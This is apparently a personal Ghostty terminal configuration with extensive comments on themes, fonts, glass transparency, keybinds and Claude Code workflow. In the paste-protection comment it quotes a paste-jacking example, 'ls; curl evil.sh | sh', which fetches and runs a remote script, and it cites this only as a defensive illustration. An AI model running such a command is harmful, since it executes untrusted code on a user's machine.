# ═══════════════════════════════════════════════════════════════
#  Ghostty — Claude Code edition
#  Active theme: see the `theme =` line below (a custom from ghostty/themes/,
#  the "stack theme" family). Typeface: PlemolJP Console NF.
#
#  NOTE: Ghostty does NOT allow inline comments on the same line
#  as a value. They always go on their own line.
# ═══════════════════════════════════════════════════════════════

# ─── theme ────────────────────────────────────────────────────
# Accepts a custom one from ghostty/themes/ (the stack family, below) or a
# Ghostty built-in (469 available, list them with `ghostty +list-themes`
# or preview at https://ghosttythemes.com).
# Warm built-in picks: Gruvbox Material Dark, Gruvbox Dark Hard, Everforest
# Dark Hard, Kanagawa Wave (dark) — Gruvbox Material Light, Rose Pine
# Dawn, Catppuccin Latte, Kanagawa Lotus (light). Solarized pick:
# Solarized Dark Patched (craftzdog style).
#
# NOTE: this `theme =` is THE active selection and the source of truth. Since
# the file is versioned, a `git pull` propagates the theme to the other
# machines. To change the look: edit this line (and the equivalent lines
# in nvim and tmux — they share the id) and commit. There's no switcher and no pointer.
#
# craftzdog's theme, ported into the family (2026-09-11). His line reads
# `theme = "Solarized Dark - Patched"` and that string DOES NOT RESOLVE — the
# built-in is named "Solarized Dark Patched", no hyphen:
#
#   theme "Solarized Dark - Patched" not found, tried path
#   .../Ghostty.app/Contents/Resources/ghostty/themes/Solarized Dark - Patched
#
# His file is from feb-2025 with two commits total, so the line has been dead a
# while and he is really looking at Ghostty's default palette. This is the theme
# he MEANT.
#
# Selected here as `solarized-patched`, a versioned copy in ghostty/themes/, and
# NOT by the built-in name. The built-in lives inside Ghostty.app, where nvim,
# tmux and Windows Terminal cannot reach it — naming it there would leave the
# other three layers with nothing to mirror and break the one-id rule. The port is
# hex-verbatim from the shipped file; provenance is in the theme file itself.
#
# A different palette from `solarized-dark`, also in this family: that one is
# Schoonover's canonical scheme, this cut re-tunes every value.
theme = typesafe-dark

# Custom themes — they live in `ghostty/themes/` (symlinked to
# <config-dir>/themes/ by install.sh). Canonical family of the stack (same
# id in Ghostty/nvim/tmux; to flip the look you edit the 3 configs):
#   · light-2026 — clone of the "2026 Light" theme that Microsoft shipped as
#     VS Code's new default (extensions/theme-defaults/themes/2026-light.json,
#     the 2026 "Focus" refresh). Pure white + blue accent #0069CC.
#   · dark-2026 — dark companion of light-2026, clone of "Dark 2026"
#     (extensions/theme-defaults/themes/2026-dark.json, VS Code's default
#     since 1.113). Near-black #121314 + teal-blue accent #3994BC.
#   · carbon — minimal true-black (#000) + high contrast, a single
#     Claude orange accent (#d97757).
#   · solarized-osaka — deep-ocean craftzdog style (near-black blue). In
#     Ghostty it's the `solarized-osaka` theme; the palette comes from the nvim plugin.
#   · xcode-oled — Xcode "Default (Dark)" syntax (real hex from Apple's
#     plist) over true black (#000). Made for OLED: the background's
#     pixels are switched off. It replaced oled-neon (Dracula) in the family.
#   · naysayer — Jonathan Blow's editor colours: deep teal (#052329), warm
#     sand text, and comments as the brightest thing on screen. Source is his
#     editor's own colour-slot table, not the community ports.
#   · anthropic-dark — Claude.ai dark (brown-black + Claude orange).
#   · anthropic-warm — warm charcoal + the Claude palette (terracotta, olive,
#     amber, orange). Made for display-p3 + transparency, long sessions
#     without fatigue.
#   · prism-night — deep night blue (#0a0e1a) with spectrum accents
#     (orange → yellow → green → cyan → blue → violet).
#     Sampled from the macOS "prism" wallpaper.
#   · paper — light cream + sepia ink.
#   · solarized-light — Ethan Schoonover's canonical Solarized Light.
#   · solarized-dark — its dark companion, the canonical one (base03 canvas,
#     published accents) — the original, not the osaka fork above.
#   · solarized-patched — the "Solarized Dark Patched" cut, ported hex-verbatim
#     from the Ghostty built-in of that name because craftzdog's config selects
#     it. Darker canvas (#001e27) and every accent re-tuned against canonical.
#   · xray — the palette of the `xray` dock icon: monochrome PCB
#     canvas (#101010), silver ghost text (#cdcecf), one cool "film blue"
#     accent, ANSI kept but desaturated. Grays sampled from the icon itself.
#   · typesafe — the sage canvas of typesafe.ai (#abbab9, from the page's own
#     CSS) + black text and its #09aea1 teal; the ANSI derived on those hues,
#     darkened to read over a light canvas. Light theme.
#   · typesafe-dark — its dark companion: the same sage hue at 11% lightness
#     (#182221, derived — the page has no dark mode); every other value tuned
#     to that canvas in OKLCH, the page's tokens giving only the hues.
# ─── craftzdog's two overrides ────────────────────────────────
# Both WIN over the theme's own values regardless of order, so they are the pair
# that decides what the terminal actually looks like.
#
# `background = #031219` is his, verbatim: a deep ocean near-black blue, over the
# patched cut's own #001e27. Comment it out the day a theme should own its canvas.
#
# `foreground = #ffffff` is ALSO what he reads, but by accident rather than by a
# line in his file. His `theme =` doesn't resolve (see above), so his foreground
# falls back to Ghostty's default — and that default is pure white, confirmed with
# `ghostty +show-config --default`. Pinning it here reproduces his text tone on
# top of a theme that actually loads.
#
# It is a big departure from Solarized, which is the point of writing it down:
# white on #031219 is 19.01:1 contrast against 4.72:1 for the patched cut's own
# #708284. Solarized deliberately keeps body text muted so the accents carry the
# meaning; this makes the text the loudest thing on screen instead.
# Drop this line to get the theme's real foreground back. Intermediate options if
# white is too harsh: #819090 (the cut's base1, 5.73:1) or #eae3cb (its ANSI
# white, warmer).
#
# Only the terminal. His nvim is NOT white — it runs solarized-osaka.nvim with
# that theme's own muted fg — so nvim and tmux keep the patched palette here.
#
# Both OFF since 2026-09-18: `typesafe` owns its canvas (#abbab9, the page's own
# background) and white text on it would be invisible. Uncomment the pair when
# solarized-patched comes back.
# background = #031219
# foreground = #ffffff

# sRGB since 2026-09-18, under typesafe. `display-p3` reads every hex as a P3
# coordinate, which on a wide-gamut screen pushes the sage #abbab9 greener and
# more saturated than the browser paints it — CSS `rgb()` is sRGB, and the
# theme's whole point is matching that page. The Ghostty doc for this key names
# `srgb` as the default. Was `display-p3` (orange and cream saturate more on
# M-chip screens); go back to it under a dark theme whose palette was never
# matched against a browser.
window-colorspace = srgb
# window-colorspace = display-p3

# Automatic minimum contrast. Fine tradeoff:
#   1.1 = no enforcement (friendly default). Dim grays evaporate
#         in light themes, brand colors stay faithful.
#   3.0 = WCAG AA large-text. Rescues the worst grays but preserves
#         brand colors like Claude orange (#d97757, ratio 3.28:1 over
#         cream — passes untouched). Sweet spot for light themes (light-2026,
#         paper, solarized-light).
#   4.5 = WCAG AA body text. Rescues every gray but DISTORTS brand
#         colors: Claude orange ends up nearly black. Not recommended.
# Still 1.1 (2026-09-11) under solarized-osaka, which is also what craftzdog runs:
# he sets no minimum-contrast at all, so anything above 1.1 would already be a
# departure from his look. It was 1.1 under naysayer too (2026-09-09, where it was
# load-bearing — his near-invisible Ghost_Character depends on no enforcement) and
# 3.0 under solarized-dark (2026-08-13).
#
# 1.1 under typesafe (2026-09-18) even though it is a light theme. The "3.0 for
# light themes" rule above assumes a cream or white canvas, where Claude orange
# clears 3:1 untouched; over the sage #abbab9 the brand set sits at 1.1–1.8:1
# (orange 1.55, blue 1.46, green 1.83) and 3.0 rewrote all of it, so Claude
# Code's spinner and accents came out as dark mud. The theme's own 16 slots are
# tuned above 3:1 by construction and need no enforcement.
minimum-contrast = 1.1

# ─── typography ───────────────────────────────────────────────
# PlemolJP Console NF — primary (2026-09-08) after Google Sans Code
# (2026-08-22), Paper Mono (2026-08-19), Google Sans Code (2026-08-13), the
# first PlemolJP Console NF trial (2026-08-03), Paper Mono (2026-07-30), Google
# Sans Code (2026-07-29) and 0xProto (2026-07-28).
# IS a Nerd Font, so it carries its own powerline/devicon glyphs instead of
# leaning on Ghostty's fallback into the other NF families. It also has real
# italic files, no obliquing (Paper Mono ships none and gets slanted).
# Installed by brew (`font-plemol-jp-nf`, already in install.sh's cask list) —
# nothing to add there.
# To go back: font-family = "Google Sans Code", "Paper Mono",
# "0xProto Nerd Font Mono" or "Maple Mono NF".
# Cross-checked against `ghostty +list-fonts` — the family reports as
# "PlemolJP Console NF". Note the SEPARATE "PlemolJP35 Console NF" family that
# also ships in the cask: that is the 3:5 width cut for JP text, not this one.
# +validate-config does NOT catch a missing family, it falls back silently.
#
# Tried and dropped the same day (2026-09-18): the typography of typesafe.ai,
# the page the `typesafe` theme is built on. Its body is "Die Grotesk C
# Regular" at 17px / 400 / 0.05em tracking / 120% leading — proportional and
# commercial, so it cannot come to a terminal grid. JetBrains Mono (its caption
# face, 12px/300) and Geist Mono (a grotesk mono stand-in, at the body's
# recipe, then at Medium) were both tried and rejected on sight: neither
# carries the page's stroke. Nothing of that round survives here.
font-family = "PlemolJP Console NF"

# Weight lives in the STYLE here, not in a variation axis (2026-09-08).
# PlemolJP is not a variable font — it has no `fvar` at all, so a
# `font-variation = wght=…` line would be read and silently ignored. What it
# ships instead is eight drawn weights, which Ghostty groups as styles of the
# one family: Thin 100 · ExtraLight 200 · Light 300 · Regular 400 · Text 450 ·
# Medium 500 · SemiBold 600 · Bold 700.
# Medium (500) is the pick, settled after trying Text (450, too light) and
# SemiBold (600, heavy enough to collapse against bold — 700 is one step away,
# so the roman and bold stop reading as different). 500 keeps two steps of
# separation, which is what makes bold still look bold.
# Ghostty matches `font-style` against the style string the font advertises;
# these four are its nameID 17/2 values verbatim, confirmed with
# `ghostty +list-fonts --family="PlemolJP Console NF" --style=Medium`.
font-style = Medium
font-style-italic = Medium Italic
font-style-bold = Bold
font-style-bold-italic = Bold Italic

# 17 — the one place this config does NOT follow craftzdog (2026-09-11). He sets no
# font-size at all, which means Ghostty's default of 13 (verified with
# `ghostty +show-config --default`, and his file has never had the key: 2 commits,
# both feb-2025). That reads far too small here, because PlemolJP's Latin sits on a
# JP half-width body — x-height 0.501 em, advance 0.528 — so 13 in this family is
# optically smaller than 13 in most monos.
# 17 is the size that matches the x-height of the Google Sans Code this replaced
# (0.501 × 17 = 8.52px against 8.38), i.e. the right value on paper. It was dropped
# to 16 on 2026-09-08 for reading a touch big, and came back today. 19 was the
# earliest try and overshot in both axes; 16 is the step down if 17 crowds the columns.
font-size = 17

# Standard ligatures — and here they are REAL. Unlike Google Sans Code (whose
# GSUB has no `liga` at all, so this line was inert for months), PlemolJP ships
# an actual `liga`, so this one does something.
# It also has a real `zero` feature, which Google Sans Code did not: add
# `font-feature = zero` on its own line to get the slashed zero.
font-feature = +liga

# Off on Retina (2026-08-26). This exists to compensate 1x panels; on a 2x
# display `true` implies the max `font-thicken-strength = 255` (that's the
# default when thickening is on, NOT a mild setting), which reads like a
# heavier weight but with smeared contours. Doubly pointless here: the weight
# is already picked by `font-style` above, from a drawn cut. On a non-Retina
# external monitor turn it back on — or keep it on with
# `font-thicken-strength = 40` for a bit of body without the smear.
font-thicken = false

# Compact line spacing — a touch over the default so that
# accents/descenders don't stick together, without wasting verticals.
# Raise to 10-15% if you want more air, drop to 0% for Iosevka's native.
adjust-cell-height = 3%

# Faint (SGR 2) text at 70% instead of the default 50%. Claude Code leans on
# faint constantly — paths, timestamps, hints, the dimmed half of a diff — and
# half opacity over a near-black canvas puts all of it near the floor of what is
# readable. 0.7 keeps the hierarchy without making faint compete with body text.
faint-opacity = 0.7

# Bold uses the bright half of the palette rather than the same colour at a
# heavier weight. It earns its place now that `foreground` is pure white: against
# white body text a bold glyph in the same colour reads as barely different, and
# the drawn Bold cut (font-style-bold above) is doing all the work alone.
# In this palette the brights are the Solarized base greys plus orange and violet.
bold-color = bright

# ─── window ───────────────────────────────────────────────────
# `transparent` (2026-09-11), which is also Ghostty's own default. It was `tabs`
# — the Chrome/Arc style that integrates the tab bar into the titlebar and frees
# ~1 vertical line — and that style is incompatible with the glass: the binary's
# docs describe it as a fully custom titlebar that ALWAYS matches the terminal's
# background colour, so it paints an opaque strip while the body below is
# translucent. Visible as a hard band across the top of the window.
# `transparent` lets the window background through instead, at the cost of the
# tab bar becoming its own row again.
# Alternatives: tabs (opaque, integrated) · native (standard macOS, opaque) ·
# hidden (no titlebar; the top area then can't drag the window).
#
# NOTE this one does NOT apply on reload — the docs say changing it at runtime
# only affects NEW windows. ⌘N after ⌘⇧R, or the old titlebar stays.
macos-titlebar-style = transparent

# GLASS (2026-09-11, off again 2026-09-18 — see the values below). It returned as
# craftzdog's pair, but neither value is still his.
#
# The other half of this lives in nvim: `transparent = true` on the ACTIVE theme's
# spec (lua/themes/solarized-patched.lua carries it). Without it nvim paints an
# opaque canvas over the glass and the seam shows at every split edge, so the two
# move together — and the setting does not follow a theme around, so a theme swap
# means checking the new spec carries it. `typesafe` (active since 2026-09-18)
# does NOT: it is a light theme and a light canvas over the glass is unreadable
# (see colorscheme.lua), so nvim stays opaque under it and the seam is accepted.
#
# NATIVE GLASS instead of his blur. His line is `background-blur-radius = 20` —
# the pre-1.1 name of the key, still accepted as an alias, and 20 is simply what
# `true` means, so he picked the plain default rather than a tuned radius. That is
# a gaussian blur Ghostty computes itself.
#
# `macos-glass-clear` is the system's own glass material, available since macOS 26
# and therefore impossible in his config (feb-2025). Written with the modern key
# name on purpose: the value is a material, not a radius. The other material is
# `macos-glass-regular`, the standard cut; this is the highly transparent one, so
# the desktop behind reads through much more. Both were looked at before picking.
#
# 0.95, up from his 0.9. The glass carries its own opacity on top of this one, and
# `background-opacity-cells` below pushes both down onto cells that set their own
# background — so with the clear material the compounding was enough to make
# lazygit panels and diff hunks feel thin. Raising this is the first knob, before
# going back to `regular`.
#
# To restore his exact pair: `background-opacity = 0.9` and
# `background-blur-radius = 20`.
#
# OFF since 2026-09-18, under `typesafe`: the desktop bleeding through a light
# sage canvas muddied it, and a light theme cannot take `transparent = true` in
# nvim anyway. The material pair is kept below, commented, for the next dark
# theme. With opacity at 1.0 `background-opacity-cells` is inert and stays.
background-opacity = 1.0
background-blur = 0
# background-opacity = 0.95
# background-blur = macos-glass-clear

# Without this the glass is only half on. `background-opacity` applies to the
# WINDOW background alone, so any cell carrying an explicit background colour
# stays fully opaque — Ghostty's own docs call out Neovim and tmux as the programs
# that repaint cell backgrounds and therefore "may not respect
# background-opacity (by design)". In practice that is every diff hunk, selection,
# fzf row and lazygit panel landing as a solid block over a translucent window.
# `true` extends the opacity to those cells too.
background-opacity-cells = true

# Blend alpha in linear space with the correction step. macOS defaults to
# `native` (Display P3); `linear-corrected` removes the darkening artifacts around
# glyph edges — worst on red/green pairs — while keeping text the same weight,
# which plain `linear` does not (it thins dark text and fattens light text).
# Only matters because there is transparency behind the glyphs; with a solid
# background the two are indistinguishable.
alpha-blending = linear-corrected

# ─── shaders ──────────────────────────────────────────────────
# Post-process passes over the rendered terminal, Shadertoy-style GLSL from
# ghostty/shaders/ (symlinked beside this file by install.sh; the path is
# relative to this file's directory). Repeat the key to chain passes.
#
# `crt` (2026-09-18): a still CRT — scanlines, aperture grille, faint bloom,
# vignette. No curvature, no rolling band: the shader never reads iTime, so
# the animation loop below is off and the pass only re-renders when the
# terminal does. Strengths are tuned for the light typesafe canvas and live
# as constants at the top of the file.
#
# A shader that fails to compile is silently skipped — the error goes to the
# system log, not to `+show-config`:
#   log show --predicate 'process == "ghostty"' --last 5m | grep -i shader
#
# OFF since 2026-09-18, the same day it landed: tried for an afternoon and
# taken out by taste. The file and the symlink stay; uncomment the one line to
# get it back. `custom-shader-animation` is left set — it is inert without a
# shader and the CRT wants it false.
# custom-shader = shaders/crt.glsl
custom-shader-animation = false

# breathe sideways — generous padding so that Claude Code's dense
# output (tool calls, diffs, trees) doesn't feel cramped.
window-padding-x = 22
window-padding-y = 18

# centers content on reflow
window-padding-balance = true

# extend = the padding inherits the color of the cell adjacent to the border
# (it looks more cohesive when selecting text near the margin).
window-padding-color = extend

# restores the session when reopening Ghostty
window-save-state = always

# `always`, not the default `true`. `true` asks only when shell integration
# reports a process still running, which is exactly the case tmux defeats: the
# pane's foreground process is the shell, and the Claude Code sessions live in
# tmux sessions the terminal knows nothing about. `always` confirms every close,
# so a stray ⌘W cannot take a surface down without a prompt.
confirm-close-surface = always

# ─── cursor ───────────────────────────────────────────────────
# Block + blink — craftzdog's pair, and also Ghostty's own default shape. The
# color comes from the active theme (cursor-color + cursor-text); under osaka
# that is the magenta #d23681, and with a block `cursor-text` matters again
# because the cursor covers the glyph underneath. Other options: bar (a thin
# caret, what was here between 2026-08 and today), block_hollow, underline.
cursor-style = block

# Blinking, his setting too. A block that blinks is the loudest combination of
# the two axes — set this false for a steady cursor if it gets distracting.
cursor-style-blink = true

# ─── selection and copying ────────────────────────────────────
# selecting already copies (fast workflow)
copy-on-select = clipboard

# Trims trailing spaces/newlines when copying — avoids the classic
# "I pasted a command and it ran by itself because there was a \n at the end".
clipboard-trim-trailing-spaces = true

# Paste protection — Ghostty shows you a confirm dialog if the pasted
# text contains newlines or suspicious control characters
# (typical attack: copying "ls" from a website that's actually
# "ls; curl evil.sh | sh\n"). Cost: an occasional extra click.
clipboard-paste-protection = true

# ─── scrollback ───────────────────────────────────────────────
# big buffer to re-read long outputs
scrollback-limit = 100000

# ─── notifications ────────────────────────────────────────────
# Silence the bells — in SDD, interruptions break the flow.
# bell-features controls every mode of the bell.
bell-features = no-system,no-audio,no-attention,no-title,no-border

# ─── mouse ────────────────────────────────────────────────────
mouse-hide-while-typing = true

# ─── quick terminal (Quake-style drop-down) ───────────────────
# ⌥` opens a floating terminal on top of any app so you can
# check something without losing your main window's context.
# It closes with the same combo but the process stays alive
# in the background — ideal for keeping persistent tmux sessions
# (claude, lazygit, REPLs) that you reopen instantly.
quick-terminal-position = top
# 100% = takes up the whole screen (full-screen popup). If at some
# point you want to go back to the small Quake-style "drop-down" mode,
# set 40% or 50%.
quick-terminal-size = 100%
quick-terminal-animation-duration = 0.15

# Stay open when focus moves to another app (macOS default is to hide). The
# premise of this surface here is a persistent tmux session — claude, lazygit,
# REPLs — so vanishing the moment you click a browser to read something is the
# opposite of what it is for. Closing is ⌥` again, deliberately.
quick-terminal-autohide = false

keybind = global:alt+grave_accent=toggle_quick_terminal

# ─── splits ───────────────────────────────────────────────────
# ⌘D opens a split on the right and ⌘⇧D a split below (Ghostty defaults).
# vim-style navigation between splits — key when you have
# [spec | implementation | tests] side by side.
keybind = cmd+alt+h=goto_split:left
keybind = cmd+alt+j=goto_split:bottom
keybind = cmd+alt+k=goto_split:top
keybind = cmd+alt+l=goto_split:right
keybind = cmd+shift+enter=toggle_split_zoom
keybind = cmd+alt+equal=equalize_splits

# Reset font-size — useful when doing demos or screen-sharing specs
keybind = cmd+zero=reset_font_size

# Shift+Enter = newline in Claude Code (instead of submit). Ghostty
# by default follows modifyOtherKeys and sends `\x1b[27;2;13~`, which
# Claude Code doesn't interpret as a newline. Sending `\n` directly does
# work — TUIs like nvim/lazygit don't see Shift+Enter without this
# but they don't need it either. Workaround documented in ghostty
# discussion #7780 and claude-code issue #5757.
keybind = shift+enter=text:\n

# ═══════════════════════════════════════════════════════════════
#  PACKAGE 1 — macOS essentials
# ═══════════════════════════════════════════════════════════════

# Option (⌥) works as Alt → vim/zsh/emacs keybinds work.
# `left`: only the LEFT Option maps as Alt. The RIGHT Option
# stays free for special characters with an ES keyboard (⌥+ñ, ⌥+5 = €,
# ⌥+8 = •, ⌥+e = ´, etc.). Better than `true` (both) if you type specials.
macos-option-as-alt = left

# Give ⌥← / ⌥→ back to the running program. Ghostty binds them by default to
# `esc:b` / `esc:f` (readline word-jump, confirmed with
# `ghostty +list-keybinds --default`), which it then sends INSTEAD of the raw
# key — so tmux, nvim and any TUI that wants ⌥+arrow never sees it.
# `alt+left` / `alt+right` is craftzdog's spelling verbatim; `arrow_left` /
# `arrow_right` is what Ghostty prints in `+list-keybinds`, and both parse.
keybind = alt+left=unbind
keybind = alt+right=unbind

# Global show/hide of every Ghostty window from any app — his line, the only one
# in his config we didn't already have. Note it is COMMENTED OUT in his repo, so
# this is one step past copying him: he wrote it and chose not to run it.
# Distinct from the quick terminal below (⌥` ), which summons a separate floating
# surface instead of toggling the real windows.
keybind = global:cmd+ctrl+shift+j=toggle_visibility

# Shell integration: enables the stand-by cursor with sudo,
# injects the path for opening files by click, etc.
shell-integration-features = cursor,sudo,title,no-ssh-env,no-ssh-terminfo,path

# ═══════════════════════════════════════════════════════════════
#  PACKAGE 2 — Long-command notifications
# ═══════════════════════════════════════════════════════════════

# Notifies via macOS when a command finishes AND the window
# is in another app (it doesn't bug you if you're already looking at the terminal).
notify-on-command-finish = unfocused

# Only notifies if it took more than 10 seconds.
notify-on-command-finish-after = 10s

# Native macOS notification, without the bell sound.
notify-on-command-finish-action = no-bell,notify

# ═══════════════════════════════════════════════════════════════
#  PACKAGE 3 — Visual polish
# ═══════════════════════════════════════════════════════════════

# Unfocused splits dim to 85% — you see instantly where you're typing.
unfocused-split-opacity = 0.85

# Shows the dimensions (cols×rows) when resizing the window.
resize-overlay = always
resize-overlay-position = center

# ═══════════════════════════════════════════════════════════════
#  PACKAGE 4 — Productive keybinds
# ═══════════════════════════════════════════════════════════════

# Clears the screen (preserves the scrollback).
keybind = cmd+k=clear_screen

# Opens the config file with your default editor.
keybind = cmd+comma=open_config

# Reloads the config without restarting Ghostty.
keybind = cmd+shift+r=reload_config

# Copies the URL selected in the buffer to the clipboard.
keybind = cmd+shift+u=copy_url_to_clipboard

# Changes the current tab's title (useful for organizing SDD).
keybind = cmd+shift+i=prompt_surface_title

# Jump-to-prompt (requires shell-integration, already active above).
# Jumps to the previous/next prompt in the scrollback — key to
# re-read long Claude Code outputs without scrolling by hand.
keybind = cmd+up=jump_to_prompt:-1
keybind = cmd+down=jump_to_prompt:1

# Tabs by number: ⌘1..⌘9 jumps straight to that tab.
keybind = cmd+one=goto_tab:1
keybind = cmd+two=goto_tab:2
keybind = cmd+three=goto_tab:3
keybind = cmd+four=goto_tab:4
keybind = cmd+five=goto_tab:5
keybind = cmd+six=goto_tab:6
keybind = cmd+seven=goto_tab:7
keybind = cmd+eight=goto_tab:8
keybind = cmd+nine=goto_tab:9

# ═══════════════════════════════════════════════════════════════
#  PACKAGE 5 — dock icon: the built-in `official` style
# ═══════════════════════════════════════════════════════════════

# `official` (2026-09-15) — Ghostty's own icon: a blue CRT gradient behind the
# glowing ghost and its `>_` prompt, in a dark chrome frame. It is the only style
# that carries the project's real colours, and the one the update dialog always
# shows regardless of this setting, so dock and updater stop disagreeing.
#
# Third icon of the day. `xray` (white ghost over a monochrome PCB) read too
# industrial next to a Tahoe dock; `glass` was the macOS 26 answer to that and
# went too far the other way — the material is so clear that the icon reads as an
# empty slot in the dock. Colour beats matching the OS material here.
#
# Still a stock style on purpose. The icon never followed `theme =` (Ghostty has no
# such binding), so a `custom-style` icon would be a second palette to keep in sync
# by hand for a 128px square you glance at. If the blue ever has to go, that is the
# escape hatch — e.g. the terminal's own canvas as the screen:
#   macos-icon = custom-style
#   macos-icon-frame = aluminum
#   macos-icon-ghost-color = #ffffff
#   macos-icon-screen-color = #031219,#001e27
#
# Other built-in styles: glass (translucent), blueprint, chalkboard, xray,
# holographic, paper, retro, microchip. Note microchip is the GREEN board with an
# orange trace and xray the monochrome one — the names are easy to swap and the
# only way to tell is to look (the PNGs live in Assets.car, `MicrochipImage` /
# `XrayImage`). And `custom-style`, the only one that takes colors — it then
# REQUIRES macos-icon-frame (aluminum|beige|plastic|chrome),
# macos-icon-ghost-color and macos-icon-screen-color (a linear vertical
# gradient, first color = bottom). `macos-custom-icon` takes a PNG/ICNS path.
# Enumerated from `ghostty +show-config --default --docs` on 1.3.1.
macos-icon = official

# ═══════════════════════════════════════════════════════════════
#  PACKAGE 6 — Fullscreen pro (macOS)
# ═══════════════════════════════════════════════════════════════

# Non-native fullscreen: without the macOS animated transition
# (it doesn't send Ghostty to another "space"), keeps the menubar visible.
# Much better for quick focus mode with ⌘↩.
# Other options: false (native), true (non-native without menubar).
macos-non-native-fullscreen = visible-menu

# If you prefer to hide the traffic lights (red/yellow/green) when
# you enter fullscreen for a cleaner view, uncomment:
# macos-window-buttons = hidden

